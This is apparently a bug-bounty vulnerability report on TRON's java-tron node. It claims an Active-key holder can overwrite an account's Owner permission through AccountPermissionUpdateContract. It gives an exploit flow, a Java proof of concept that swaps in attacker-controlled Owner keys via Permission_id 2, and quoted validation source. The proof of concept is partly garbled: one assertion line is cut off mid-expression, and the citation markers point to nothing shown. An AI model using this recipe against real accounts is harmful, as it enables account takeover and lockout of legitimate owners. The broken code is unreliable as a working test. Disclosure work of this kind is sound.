### Title
Active-key holder with AccountPermissionUpdateContract operation bit can overwrite Owner permission via Active-threshold signature - (File: actuator/src/main/java/org/tron/core/actuator/AccountPermissionUpdateActuator.java)

### Summary
`AccountPermissionUpdateActuator.validate()`/`execute()` never verify that the signer of an `AccountPermissionUpdateContract` actually holds Owner-level authority; signature authorization is delegated entirely to `TransactionCapsule.validateSignature`/`checkPermission`, which allow any Active permission whose operations bitmap includes `AccountPermissionUpdateContract` to satisfy the check via `Permission_id`. Because `checkPermission()` inside the actuator only validates internal well-formedness of the new Owner permission (key count, threshold, weight sum) and never diffs against the account's existing Owner permission, an attacker holding a low-weight Active key with that operation bit can replace the entire Owner permission with attacker-controlled keys.

### Finding Description
- The contract carries a `Permission_id` field [1](#0-0) , used to select which of the account's permissions (Owner=0, Witness=1, Active=2-9) must sign the transaction.
- `TransactionCapsule.validateSignature` resolves the permission by this id and calls `checkPermission(permissionId, permission, contract)`, which only enforces that non-zero `permissionId` correspond to an `Active`-type permission whose `operations` bitmap has the bit for the transaction's contract type set — it does not special-case `AccountPermissionUpdateContract` to force `permissionId == 0` (Owner): [2](#0-1) [3](#0-2) 
- The same permissive pattern is used at broadcast time in `Wallet.getTransactionApprovedList` and generally through `validatePubSignature`, confirming no path forces Owner-only signing for this contract type: [4](#0-3) 
- `AccountPermissionUpdateActuator.validate()` calls `checkPermission(owner)` only to validate the *new* Owner permission's internal consistency (key count ≤ max, threshold > 0, weight sum ≥ threshold, valid addresses, operations empty for non-Active types) — it never compares the proposed Owner permission against the account's *current* Owner permission or requires that the transaction be signed under the existing Owner threshold: [5](#0-4) 
- `execute()` then unconditionally overwrites the account's permissions with whatever was supplied in the contract: [6](#0-5) 

Exploit flow: The legitimate owner creates (intentionally or by mistake) an Active permission whose `operations` bitmap includes the bit for `AccountPermissionUpdateContract` (bit index 46). An attacker who controls a key listed in that Active permission — even with a very low weight, as long as weight ≥ that Active permission's threshold or attacker collects enough co-signers of that Active permission — builds an `AccountPermissionUpdateContract` naming a brand-new Owner permission (with only attacker addresses), sets `Permission_id` on the wrapping `Contract` to the attacker's Active permission id, and signs solely with the Active key(s). `validateSignature`/`checkPermission` accept this because the signature check is scoped to the Active permission (which is satisfied), not to Owner. The actuator's `validate()` only checks the new Owner permission's internal well-formedness, and `execute()` writes it in unconditionally, permanently replacing the original Owner keys.

### Impact Explanation
This is an unauthorized account-permission takeover: an attacker with only an Active key (not Owner-level authority) can squat and overwrite the account's Owner permission, permanently locking out the legitimate owner from all Owner-gated operations (e.g., account-id changes, future permission updates requiring Owner threshold, etc.), matching the "unauthorized account operations / permanent account lockout" bounty class.

### Likelihood Explanation
Preconditions: the account owner must have created an Active permission whose operation bitmap includes `AccountPermissionUpdateContract` (bit 46) — this is a normal, legitimate multisig configuration pattern (e.g., granting an Active key broad "admin" rights), not a privileged or attacker-controlled setup. Given that precondition, exploitation costs only the standard transaction fee and requires no elevated access — it is a single signed, broadcastable transaction. This is fully attacker-reachable through the normal broadcast RPC path with no additional bypass needed.

### Recommendation
Enforce that `AccountPermissionUpdateContract` may only be authorized under the account's Owner permission (`Permission_id == 0` / Owner threshold), regardless of any Active permission's operations bitmap — i.e., special-case this contract type (and any other contract type mutating Owner/Active/Witness permission sets) in `TransactionCapsule.checkPermission` similarly to how Witness-only fields are restricted, rejecting active-signed transactions for this contract type. Additionally, `AccountPermissionUpdateActuator.validate()` should independently verify the signing permission id used for the transaction is Owner before allowing an Owner-permission replacement.

// 1. Owner account has an Active permission (id=2) with bit for AccountPermissionUpdateContract (46) set,
//    threshold satisfied by attacker-held key KEY_ADDRESS_ATTACKER.
Permission maliciousOwnerPermission = Permission.newBuilder()
    .setType(PermissionType.Owner)
    .setThreshold(1)
    .addKeys(Key.newBuilder().setAddress(ATTACKER_ADDRESS).setWeight(1).build())
    .build(); // original owner key omitted entirely

AccountPermissionUpdateContract contract = AccountPermissionUpdateContract.newBuilder()
    .setOwnerAddress(OWNER_ADDRESS)
    .setOwner(maliciousOwnerPermission)
    .addActives(existingActivePermissionWithOpBit46)
    .build();

Transaction.Contract txContract = Transaction.Contract.newBuilder()
    .setType(ContractType.AccountPermissionUpdateContract)
    .setParameter(Any.pack(contract))
    .setPermissionId(2) // attacker's Active permission id, NOT Owner (0)
    .build();

// Sign only with attacker's active private key (weight satisfies active threshold=1)
// -> TransactionCapsule.validateSignature succeeds because permission(2) is Active
//    and operations bit 46 is set.

AccountPermissionUpdateActuator actuator = new AccountPermissionUpdateActuator();
actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(Any.pack(contract));
actuator.validate();
actuator.execute(new TransactionResultCapsule());

AccountCapsule updated = dbManager.getAccountStore().get(OWNER_ADDRESS_BYTES);
// Assert original owner key is gone and attacker key now controls Owner permission

    .stream().anyMatch(k -> k.getAddress().equals(ORIGINAL_OWNER_KEY)));
Assert.assertTrue(updated.getInstance().getOwnerPermission().getKeysList()
    .stream().anyMatch(k -> k.getAddress().equals(ATTACKER_ADDRESS)));

  public static boolean validateSignature(Transaction transaction,
      byte[] hash, AccountStore accountStore, DynamicPropertiesStore dynamicPropertiesStore)
      throws PermissionException, SignatureException, SignatureFormatException {
    Transaction.Contract contract = transaction.getRawData().getContractList().get(0);
    int permissionId = contract.getPermissionId();
    byte[] owner = getOwner(contract);
    AccountCapsule account = accountStore.get(owner);
    Permission permission = null;
    if (account == null) {
      if (permissionId == 0) {
        permission = AccountCapsule.getDefaultPermission(ByteString.copyFrom(owner));
      }
      if (permissionId == 2) {
        permission = AccountCapsule
            .createDefaultActivePermission(ByteString.copyFrom(owner), dynamicPropertiesStore);
      }
    } else {
      permission = account.getPermissionById(permissionId);
    }
    if (permission == null) {
      throw new PermissionException("permission isn't exit");
    }
    checkPermission(permissionId, permission, contract);
    long weight = checkWeight(permission, transaction.getSignatureList(), hash, null);
    if (weight >= permission.getThreshold()) {
      return true;
    }
    return false;
  }

  private boolean checkPermission(Permission permission) throws ContractValidateException {
    DynamicPropertiesStore dynamicStore = chainBaseManager.getDynamicPropertiesStore();
    if (permission.getKeysCount() > dynamicStore.getTotalSignNum()) {
      throw new ContractValidateException("number of keys in permission should not be greater "
          + "than " + dynamicStore.getTotalSignNum());
    }
    if (permission.getKeysCount() == 0) {
      throw new ContractValidateException("key's count should be greater than 0");
    }
    if (permission.getType() == PermissionType.Witness && permission.getKeysCount() != 1) {
      throw new ContractValidateException("Witness permission's key count should be 1");
    }
    if (permission.getThreshold() <= 0) {
      throw new ContractValidateException("permission's threshold should be greater than 0");
    }
    String name = permission.getPermissionName();
    if (!StringUtils.isEmpty(name) && name.length() > 32) {
      throw new ContractValidateException("permission's name is too long");
    }
    //check owner name ?
    if (permission.getParentId() != 0) {
      throw new ContractValidateException("permission's parent should be owner");
    }

    long weightSum = 0;
    List<ByteString> addressList = permission.getKeysList()
        .stream()
        .map(x -> x.getAddress())
        .distinct()
        .collect(toList());
    if (addressList.size() != permission.getKeysList().size()) {
      throw new ContractValidateException(
          "address should be distinct in permission " + permission.getType());
    }
    for (Key key : permission.getKeysList()) {
      if (!DecodeUtil.addressValid(key.getAddress().toByteArray())) {
        throw new ContractValidateException("key is not a validate address");
      }
      if (key.getWeight() <= 0) {
        throw new ContractValidateException("key's weight should be greater than 0");
      }
      try {
        weightSum = addExact(weightSum, key.getWeight());
      } catch (ArithmeticException e) {
        throw new ContractValidateException(e.getMessage());
      }
    }
    if (weightSum < permission.getThreshold()) {
      throw new ContractValidateException(
          "sum of all key's weight should not be less than threshold in permission " + permission
              .getType());
    }

    ByteString operations = permission.getOperations();
    if (permission.getType() != PermissionType.Active) {
      if (!operations.isEmpty()) {
        throw new ContractValidateException(
            permission.getType() + " permission needn't operations");
      }
      return true;
    }
    //check operations
    if (operations.isEmpty() || operations.size() != 32) {
      throw new ContractValidateException("operations size must 32");
    }

    byte[] types1 = dynamicStore.getAvailableContractType();
    for (int i = 0; i < 256; i++) {
      boolean b = (operations.byteAt(i / 8) & (1 << (i % 8))) != 0;
      boolean t = ((types1[(i / 8)] & 0xff) & (1 << (i % 8))) != 0;
      if (b && !t) {
        throw new ContractValidateException(i + " isn't a validate ContractType");
      }
    }
    return true;
  }
